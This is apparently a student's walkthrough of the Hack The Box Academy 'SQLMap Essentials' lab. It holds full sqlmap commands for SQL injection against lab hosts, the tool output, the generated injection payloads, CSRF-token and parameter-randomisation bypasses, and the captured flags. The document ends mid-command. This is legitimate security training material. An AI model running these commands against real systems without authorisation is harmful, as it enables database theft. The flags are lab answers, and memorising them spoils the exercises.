# SQLMap Essentials
* Source: [Hack the Box: Academy](https://academy.hackthebox.com/)
* Module: SQLMap Essentials
* Tier: II
* Difficulty: Easy 
* Category: Offensive
* Time estimate: 8 hours
* Date: DD-MM-YYYY
* Author: [DjikstraCS](https://github.com/DjikstraCS)


---
## SQLMap Overview
### Question:
![](./attachments/Pasted%20image%2020220703120903.png)

![](./attachments/Pasted%20image%2020220703120958.png)

**Answer:** `UNION query-based`

---
## Running SQLMap on an HTTP Request
### Question 1:
![](./attachments/Pasted%20image%2020220703114906.png)

*Hint: Use options "--batch --dump" to automatically dump all data.*

![](./attachments/Pasted%20image%2020220703124752.png)

```
┌──(kali㉿kali)-[~]
└─$ sqlmap 'http://157.245.33.77:32596/case2.php' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Content-Type: application/x-www-form-urlencoded' -H 'Origin: http://157.245.33.77:32596' -H 'Connection: keep-alive' -H 'Referer: http://157.245.33.77:32596/case2.php' -H 'Upgrade-Insecure-Requests: 1' --data-raw 'id=1' --batch --dump
        ___
       __H__                                                                                                                                                                              
 ___ ___["]_____ ___ ___  {1.6.5#stable}                                                                                                                                                  
|_ -| . [.]     | .'| . |                                                                                                                                                                 
|___|_  [(]_|_|_|__,|  _|                                                                                                                                                                 
      |_|V...       |_|   https://sqlmap.org                                                                                                                                              

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 06:45:25 /2022-07-03/

[06:45:25] [INFO] resuming back-end DBMS 'mysql' 
[06:45:25] [INFO] testing connection to the target URL
(...)
[06:46:22] [INFO] fetching entries for table 'flag2' in database 'testdb'
Database: testdb
Table: flag2
[1 entry]
+----+----------------------------------------+
| id | content                                |
+----+----------------------------------------+
| 1  | HTB{700_much_c0n6r475_0n_p057_r3qu357} |
+----+----------------------------------------+

[06:46:23] [INFO] table 'testdb.flag2' dumped to CSV file '/home/kali/.local/share/sqlmap/output/157.245.33.77/dump/testdb/flag2.csv'
[06:46:23] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/157.245.33.77'

[*] ending @ 06:46:23 /2022-07-03/
```

**Answer:** `HTB{700_much_c0n6r475_0n_p057_r3qu357}`

### Question 2:
![](./attachments/Pasted%20image%2020220703114935.png)

*Hint: Try to see where the 'id=1' is sent, and specify this location as the injection mark.*

Insert `*` into cookie value, `'Cookie: id=1*'`.

```
┌──(kali㉿kali)-[~]
└─$ sqlmap 'http://157.245.33.77:32596/case3.php' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Connection: keep-alive' -H 'Referer: http://157.245.33.77:32596/' -H 'Cookie: id=1*' -H 'Upgrade-Insecure-Requests: 1' --batch --dump         
        ___
       __H__                                                                                                                                                                              
 ___ ___[(]_____ ___ ___  {1.6.5#stable}                                                                                                                                                  
|_ -| . ["]     | .'| . |                                                                                                                                                                 
|___|_  [(]_|_|_|__,|  _|                                                                                                                                                                 
      |_|V...       |_|   https://sqlmap.org                                                                                                                                              

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 06:55:23 /2022-07-03/

custom injection marker ('*') found in option '--headers/--user-agent/--referer/--cookie'. Do you want to process it? [Y/n/q] Y
[06:55:23] [INFO] testing connection to the target URL
(...)
[06:56:42] [INFO] fetching entries for table 'flag3' in database 'testdb'
Database: testdb
Table: flag3
[1 entry]
+----+------------------------------------------+
| id | content                                  |
+----+------------------------------------------+
| 1  | HTB{c00k13_m0n573r_15_7h1nk1n6_0f_6r475} |
+----+------------------------------------------+

[06:56:42] [INFO] table 'testdb.flag3' dumped to CSV file '/home/kali/.local/share/sqlmap/output/157.245.33.77/dump/testdb/flag3.csv'
[06:56:42] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/157.245.33.77'

[*] ending @ 06:56:42 /2022-07-03/
```

**Answer:** `HTB{c00k13_m0n573r_15_7h1nk1n6_0f_6r475}`

### Question 3:
![](./attachments/Pasted%20image%2020220703114945.png)

*Hint: When dealing with complex HTTP requests, it's best to use sqlmap with the '-r' option.*

Get the URL 

```
┌──(kali㉿kali)-[~]
└─$ sqlmap 'http://157.245.33.77:32596/case4.php' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0' -H 'Accept: */*' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Content-Type: application/json' -H 'Origin: http://157.245.33.77:32596' -H 'Connection: keep-alive' -H 'Referer: http://157.245.33.77:32596/case4.php' --data-raw '{"id":1}' --batch --dump
        ___
       __H__                                                                                                                                                                              
 ___ ___[.]_____ ___ ___  {1.6.5#stable}                                                                                                                                                  
|_ -| . [(]     | .'| . |                                                                                                                                                                 
|___|_  [,]_|_|_|__,|  _|                                                                                                                                                                 
      |_|V...       |_|   https://sqlmap.org                                                                                                                                              

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 07:05:13 /2022-07-03/

JSON data found in POST body. Do you want to process it? [Y/n/q] Y
[07:05:13] [INFO] testing connection to the target URL
(...)
[07:06:36] [INFO] fetching entries for table 'flag4' in database 'testdb'
Database: testdb
Table: flag4
[1 entry]
+----+---------------------------------+
| id | content                         |
+----+---------------------------------+
| 1  | HTB{j450n_v00rh335_53nd5_6r475} |
+----+---------------------------------+

[07:06:36] [INFO] table 'testdb.flag4' dumped to CSV file '/home/kali/.local/share/sqlmap/output/157.245.33.77/dump/testdb/flag4.csv'
[07:06:36] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/157.245.33.77'

[*] ending @ 07:06:36 /2022-07-03/
```

**Answer:** `HTB{j450n_v00rh335_53nd5_6r475}`

---
## Attack Tuning
### Question 1:
![](./attachments/Pasted%20image%2020220703115136.png)

*Hint: You can use the option '-T flag5' to only dump data from the needed table. You can use the '--no-cast' flag to ensure you get the correct content. You may also, try running the command a few times to ensure you captured the content correctly.*

```
┌──(kali㉿kali)-[~]
└─$ sqlmap 'http://157.245.46.136:32056/case5.php?id=1' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Connection: keep-alive' -H 'Referer: http://157.245.46.136:32056/case5.php' -H 'Upgrade-Insecure-Requests: 1' --batch --dump --level=5 --risk=3 --threads=10 --flush-session -T flag5 --no-cast
        ___
       __H__                                                                                                                                                                              
 ___ ___[']_____ ___ ___  {1.6.5#stable}                                                                                                                                                  
|_ -| . [(]     | .'| . |                                                                                                                                                                 
|___|_  [,]_|_|_|__,|  _|                                                                                                                                                                 
      |_|V...       |_|   https://sqlmap.org                                                                                                                                              

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 04:52:13 /2022-07-04/

[04:52:13] [INFO] resuming back-end DBMS 'mysql' 
[04:52:13] [INFO] testing connection to the target URL
(...)
[04:52:14] [INFO] fetching entries for table 'flag5' in database 'testdb'
[04:52:14] [INFO] fetching number of entries for table 'flag5' in database 'testdb'
[04:52:14] [INFO] resumed: 1
[04:52:14] [INFO] retrieving the length of query output
[04:52:14] [INFO] resumed: 31
[04:52:14] [INFO] resumed: HTB{700_much_r15k_bu7_w0r7h_17}
[04:52:14] [INFO] retrieving the length of query output
[04:52:14] [INFO] resumed: 1
[04:52:14] [INFO] resumed: 1
Database: testdb
Table: flag5
[1 entry]
+----+---------------------------------+
| id | content                         |
+----+---------------------------------+
| 1  | HTB{700_much_r15k_bu7_w0r7h_17} |
+----+---------------------------------+
```

**Answer:** `HTB{700_much_r15k_bu7_w0r7h_17}`

### Question 2:
![](./attachments/Pasted%20image%2020220703115151.png)

*Hint: Use the prefix '`)'.*

```
┌──(kali㉿kali)-[~]
└─$ sqlmap 'http://157.245.46.136:32056/case6.php?col=id' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Connection: keep-alive' -H 'Referer: http://157.245.46.136:32056/case6.php' -H 'Upgrade-Insecure-Requests: 1' --batch --dump --threads=10 --flush-session --no-cast --prefix='`)'  
        ___
       __H__                                                                                                                                                                              
 ___ ___[']_____ ___ ___  {1.6.5#stable}                                                                                                                                                  
|_ -| . [.]     | .'| . |                                                                                                                                                                 
|___|_  [,]_|_|_|__,|  _|                                                                                                                                                                 
      |_|V...       |_|   https://sqlmap.org                                                                                                                                              

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 05:15:35 /2022-07-04/

[05:15:36] [INFO] flushing session file
[05:15:37] [INFO] testing connection to the target URL
(...)
[05:18:04] [INFO] fetching entries for table 'flag6' in database 'testdb'
Database: testdb
Table: flag6
[1 entry]
+----+----------------------------------+
| id | content                          |
+----+----------------------------------+
| 1  | HTB{v1nc3_mcm4h0n_15_4570n15h3d} |
+----+----------------------------------+
```

**Answer:** `HTB{v1nc3_mcm4h0n_15_4570n15h3d}`

### Question 3:
![](./attachments/Pasted%20image%2020220703115233.png)

*Hint: Try to count the number of columns in the page output, and specify them for sqlmap.*

```
┌──(kali㉿kali)-[~]
└─$ sqlmap 'http://157.245.46.136:32056/case7.php?id=1' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Connection: keep-alive' -H 'Referer: http://157.245.46.136:32056/case7.php' -H 'Upgrade-Insecure-Requests: 1' --batch --dump --threads=10 --no-cast --union-cols=5 
        ___
       __H__                                                                                                                                                                              
 ___ ___[']_____ ___ ___  {1.6.5#stable}                                                                                                                                                  
|_ -| . [.]     | .'| . |                                                                                                                                                                 
|___|_  [(]_|_|_|__,|  _|                                                                                                                                                                 
      |_|V...       |_|   https://sqlmap.org                                                                                                                                              

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 05:23:52 /2022-07-04/

[05:23:52] [INFO] testing connection to the target URL
(...)
[05:25:09] [INFO] fetching entries for table 'flag7' in database 'testdb'
Database: testdb
Table: flag7
[1 entry]
+----+-----------------------+
| id | content               |
+----+-----------------------+
| 1  | HTB{un173_7h3_un173d} |
+----+-----------------------+
```

**Answer:** ``

---
## Database Enumeration
### Question:
![](./attachments/Pasted%20image%2020220703115436.png)

*Hint: To be more efficient, try to specify the database and table name for sqlmap.*

First we crack the database.

```
┌──(kali㉿kali)-[~]
└─$ sqlmap 'http://157.245.46.136:32056/case1.php?id=1' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Connection: keep-alive' -H 'Referer: http://157.245.46.136:32056/case1.php' -H 'Upgrade-Insecure-Requests: 1' --batch --no-cast
        ___
       __H__                                                                                                                                                                              
 ___ ___[,]_____ ___ ___  {1.6.5#stable}                                                                                                                                                  
|_ -| . [']     | .'| . |                                                                                                                                                                 
|___|_  [.]_|_|_|__,|  _|                                                                                                                                                                 
      |_|V...       |_|   https://sqlmap.org                                                                                                                                              

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 05:43:45 /2022-07-04/

[05:43:45] [INFO] testing connection to the target URL
[05:43:45] [INFO] checking if the target is protected by some kind of WAF/IPS
[05:43:45] [INFO] testing if the target URL content is stable
[05:43:46] [INFO] target URL content is stable
[05:43:46] [INFO] testing if GET parameter 'id' is dynamic
[05:43:46] [INFO] GET parameter 'id' appears to be dynamic
[05:43:46] [INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')
[05:43:46] [INFO] heuristic (XSS) test shows that GET parameter 'id' might be vulnerable to cross-site scripting (XSS) attacks
[05:43:46] [INFO] testing for SQL injection on GET parameter 'id'
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
[05:43:46] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[05:43:46] [WARNING] reflective value(s) found and filtering out
[05:43:46] [INFO] GET parameter 'id' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --string="Rice")
(...)
```

Find the current database name.

```
┌──(kali㉿kali)-[~]
└─$ sqlmap 'http://157.245.46.136:32056/case1.php?id=1' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Connection: keep-alive' -H 'Referer: http://157.245.46.136:32056/case1.php' -H 'Upgrade-Insecure-Requests: 1' --current-db     
        ___
       __H__                                                                                                                                                                              
 ___ ___[.]_____ ___ ___  {1.6.5#stable}                                                                                                                                                  
|_ -| . [,]     | .'| . |                                                                                                                                                                 
|___|_  ["]_|_|_|__,|  _|                                                                                                                                                                 
      |_|V...       |_|   https://sqlmap.org                                                                                                                                              

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 05:45:27 /2022-07-04/

[05:45:27] [INFO] resuming back-end DBMS 'mysql' 
[05:45:27] [INFO] testing connection to the target URL
(...)
[05:45:27] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian 10 (buster)
web application technology: Apache 2.4.38
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
[05:45:27] [INFO] fetching current database
current database: 'testdb'
```

The database name is `testdb`

Find the table names.

```
┌──(kali㉿kali)-[~]
└─$ sqlmap 'http://157.245.46.136:32056/case1.php?id=1' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Connection: keep-alive' -H 'Referer: http://157.245.46.136:32056/case1.php' -H 'Upgrade-Insecure-Requests: 1' --tables -D testdb
        ___
       __H__                                                                                                                                                                              
 ___ ___[,]_____ ___ ___  {1.6.5#stable}                                                                                                                                                  
|_ -| . [']     | .'| . |                                                                                                                                                                 
|___|_  ["]_|_|_|__,|  _|                                                                                                                                                                 
      |_|V...       |_|   https://sqlmap.org                                                                                                                                              

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 05:46:01 /2022-07-04/

[05:46:02] [INFO] resuming back-end DBMS 'mysql' 
[05:46:02] [INFO] testing connection to the target URL
(...)
[05:46:02] [INFO] fetching tables for database: 'testdb'
[05:46:02] [WARNING] potential permission problems detected ('command denied')
Database: testdb
[2 tables]
+-------+
| flag1 |
| users |
+-------+
```

`flag1` seems to contain the flag.

Getting the value.

```
┌──(kali㉿kali)-[~]
└─$ sqlmap 'http://157.245.46.136:32056/case1.php?id=1' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Connection: keep-alive' -H 'Referer: http://157.245.46.136:32056/case1.php' -H 'Upgrade-Insecure-Requests: 1' --dump -T flag1 -D testdb
        ___
       __H__                                                                                                                                                                              
 ___ ___[.]_____ ___ ___  {1.6.5#stable}                                                                                                                                                  
|_ -| . [,]     | .'| . |                                                                                                                                                                 
|___|_  [.]_|_|_|__,|  _|                                                                                                                                                                 
      |_|V...       |_|   https://sqlmap.org                                                                                                                                              

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 05:47:16 /2022-07-04/

[05:47:17] [INFO] resuming back-end DBMS 'mysql' 
[05:47:17] [INFO] testing connection to the target URL
(...)
[05:52:19] [INFO] fetching entries for table 'flag1' in database 'testdb'
Database: testdb
Table: flag1
[1 entry]
+----+-----------------------------------------------------+
| id | content                                             |
+----+-----------------------------------------------------+
| 1  | HTB{c0n6r475_y0u_kn0w_h0w_70_run_b451c_5qlm4p_5c4n} |
+----+-----------------------------------------------------+
```

**Answer:** `HTB{c0n6r475_y0u_kn0w_h0w_70_run_b451c_5qlm4p_5c4n}`

---
## Advanced Database Enumeration
### Question 1:
![](./attachments/Pasted%20image%2020220703115543.png)

*Hint: Try to search for the column!*

```
┌──(kali㉿kali)-[~]
└─$ sqlmap 'http://178.62.26.185:31021/case1.php?id=1' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Connection: keep-alive' -H 'Referer: http://157.245.46.136:32056/case1.php' -H 'Upgrade-Insecure-Requests: 1' --schema --search -C style --batch

        ___
       __H__                                                                                                                                                                              
 ___ ___[(]_____ ___ ___  {1.6.5#stable}                                                                                                                                                  
|_ -| . [,]     | .'| . |                                                                                                                                                                 
|___|_  [.]_|_|_|__,|  _|                                                                                                                                                                 
      |_|V...       |_|   https://sqlmap.org                                                                                                                                              

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 06:19:28 /2022-07-04/

[06:19:29] [INFO] resuming back-end DBMS 'mysql' 
[06:19:29] [INFO] testing connection to the target URL
(...)

[06:19:53] [INFO] searching columns LIKE 'style' across all databases
[06:19:54] [WARNING] the SQL query provided does not return any output
[06:19:54] [INFO] retrieved: 'information_schema'
[06:19:54] [INFO] retrieved: 'ROUTINES'
[06:19:54] [INFO] fetching columns LIKE 'style' for table 'ROUTINES' in database 'information_schema'
[06:19:54] [WARNING] the SQL query provided does not return any output
[06:19:54] [INFO] retrieved: 'PARAMETER_STYLE'
[06:19:55] [INFO] retrieved: 'varchar(8)'
columns LIKE 'style' were found in the following databases:
Database: information_schema
Table: ROUTINES
[1 column]
+-----------------+------------+
| Column          | Type       |
+-----------------+------------+
| PARAMETER_STYLE | varchar(8) |
+-----------------+------------+
```

**Answer:** `PARAMETER_STYLE`

### Question 2:
![](./attachments/Pasted%20image%2020220703115552.png)

```
──(kali㉿kali)-[~]
└─$ sqlmap 'http://178.62.26.185:31021/case1.php?id=1' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Connection: keep-alive' -H 'Referer: http://157.245.46.136:32056/case1.php' -H 'Upgrade-Insecure-Requests: 1' -T users -D testdb --search Kimberly --batch
        ___
       __H__                                                                                                                                                                              
 ___ ___["]_____ ___ ___  {1.6.5#stable}                                                                                                                                                  
|_ -| . [,]     | .'| . |                                                                                                                                                                 
|___|_  [(]_|_|_|__,|  _|                                                                                                                                                                 
      |_|V...       |_|   https://sqlmap.org                                                                                                                                              

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 06:29:54 /2022-07-04/

[06:29:55] [INFO] resuming back-end DBMS 'mysql' 
[06:29:55] [INFO] testing connection to the target URL
(...)
 id | cc | name | email| phon| address  | birthday | password  | occupation
| 6 | 5143241665092174 | Kimberly Wright | KimberlyMWright@gmail.com | 440-232-3739 | 3136 Ralph Drive | June 18 1972 | d642ff0feca378666a8727947482f1a4702deba0 (Enizoom1609) | Electrologist 
```

**Answer:** `Enizoom1609`

---
## Bypassing Web Application Protections
### Question 1:
![](./attachments/Pasted%20image%2020220703115739.png)

*Hint: Don't forget to specify the token name.*

```
┌──(kali㉿kali)-[~]
└─$ sqlmap 'http://178.62.26.185:31021/case8.php' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Content-Type: application/x-www-form-urlencoded' -H 'Origin: http://178.62.26.185:31021' -H 'Connection: keep-alive' -H 'Referer: http://178.62.26.185:31021/case8.php' -H 'Cookie: PHPSESSID=ghk930kfjur5o234c4gbnsqtcu' -H 'Upgrade-Insecure-Requests: 1' --data-raw 'id=1&t0ken=NvUUVmbpIFMds3n0cjbmaVmVvWcSHife43ppbByF0' --csrf-token="t0ken" --batch 
        ___
       __H__                                                                                                                                                                              
 ___ ___[)]_____ ___ ___  {1.6.5#stable}                                                                                                                                                  
|_ -| . [)]     | .'| . |                                                                                                                                                                 
|___|_  [(]_|_|_|__,|  _|                                                                                                                                                                 
      |_|V...       |_|   https://sqlmap.org                                                                                                                                              

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 07:26:24 /2022-07-04/

[07:26:25] [INFO] testing connection to the target URL
(...)
[07:26:57] [INFO] POST parameter 'id' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
POST parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 68 HTTP(s) requests:
---
Parameter: id (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1 AND 3867=3867&t0ken=NvUUVmbpIFMds3n0cjbmaVmVvWcSHife43ppbByF0

    Type: stacked queries
    Title: MySQL >= 5.0.12 stacked queries (comment)
    Payload: id=1;SELECT SLEEP(5)#&t0ken=NvUUVmbpIFMds3n0cjbmaVmVvWcSHife43ppbByF0

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1 AND (SELECT 2847 FROM (SELECT(SLEEP(5)))oPTG)&t0ken=NvUUVmbpIFMds3n0cjbmaVmVvWcSHife43ppbByF0

    Type: UNION query
    Title: Generic UNION query (NULL) - 6 columns
    Payload: id=1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CONCAT(0x71626b7671,0x544e50534a6c62506a67594f4a7a427a526b574a79534a716f716b574e5a757a4f62624e4c594d4f,0x716a7a7071)-- -&t0ken=NvUUVmbpIFMds3n0cjbmaVmVvWcSHife43ppbByF0
---
[07:26:57] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian 10 (buster)
web application technology: Apache 2.4.38
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
```

It's open. 

Get the flag.

```
┌──(kali㉿kali)-[~]
└─$ sqlmap 'http://178.62.26.185:31021/case8.php' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Content-Type: application/x-www-form-urlencoded' -H 'Origin: http://178.62.26.185:31021' -H 'Connection: keep-alive' -H 'Referer: http://178.62.26.185:31021/case8.php' -H 'Cookie: PHPSESSID=ghk930kfjur5o234c4gbnsqtcu' -H 'Upgrade-Insecure-Requests: 1' --data-raw 'id=1&t0ken=NvUUVmbpIFMds3n0cjbmaVmVvWcSHife43ppbByF0' --csrf-token="t0ken" --dump -T flag8 -D testdb
        ___
       __H__                                                                                                                                                                              
 ___ ___[(]_____ ___ ___  {1.6.5#stable}                                                                                                                                                  
|_ -| . ["]     | .'| . |                                                                                                                                                                 
|___|_  [,]_|_|_|__,|  _|                                                                                                                                                                 
      |_|V...       |_|   https://sqlmap.org                                                                                                                                              

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 07:29:18 /2022-07-04/

[07:29:18] [INFO] resuming back-end DBMS 'mysql'
(...)
[07:29:19] [INFO] fetching entries for table 'flag8' in database 'testdb'
Database: testdb
Table: flag8
[1 entry]
+----+-----------------------------------+
| id | content                           |
+----+-----------------------------------+
| 1  | HTB{y0u_h4v3_b33n_c5rf_70k3n1z3d} |
+----+-----------------------------------+
```


**Answer:** ``

### Question 2:
![](./attachments/Pasted%20image%2020220703115749.png)

*Hint: Don't forget to specify the parameter name you need to randomize.*

```
┌──(kali㉿kali)-[~]
└─$ sqlmap 'http://178.62.26.185:31021/case9.php?id=1&uid=3668826986' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Connection: keep-alive' -H 'Referer: http://178.62.26.185:31021/case9.php' -H 'Cookie: PHPSESSID=ghk930kfjur5o234c4gbnsqtcu' -H 'Upgrade-Insecure-Requests: 1' --randomize=uid --batch
        ___
       __H__                                                                                                                                                                              
 ___ ___[']_____ ___ ___  {1.6.5#stable}                                                                                                                                                  
|_ -| . [(]     | .'| . |                                                                                                                                                                 
|___|_  [(]_|_|_|__,|  _|                                                                                                                                                                 
      |_|V...       |_|   https://sqlmap.org                                                                                                                                              

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 07:34:53 /2022-07-04/

[07:34:53] [INFO] testing connection to the target URL
(...)
[07:35:19] [INFO] GET parameter 'id' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 69 HTTP(s) requests:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1 AND 4794=4794&uid=3668826986

    Type: stacked queries
    Title: MySQL >= 5.0.12 stacked queries (comment)
    Payload: id=1;SELECT SLEEP(5)#&uid=3668826986

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1 AND (SELECT 9303 FROM (SELECT(SLEEP(5)))BXSC)&uid=3668826986

    Type: UNION query
    Title: Generic UNION query (NULL) - 6 columns
    Payload: id=1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CONCAT(0x716a707a71,0x6c4f5449674457656968794855506b7847474e735a714b585a436d72636c72734d56776c6d476763,0x7170706b71)-- -&uid=3668826986
---
[07:35:19] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian 10 (buster)
web application technology: Apache 2.4.38
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
```

It's open.

Then get the flag like in previous question.

**Answer:** `HTB{700_much_r4nd0mn355_f0r_my_74573}`

### Question 3:
![](./attachments/Pasted%20image%2020220703115759.png)

*Hint: Try to see why the page is preventing sqlmap from sending HTTP request to it, and then bypass it.*

```
┌──(kali㉿kali)-[~]
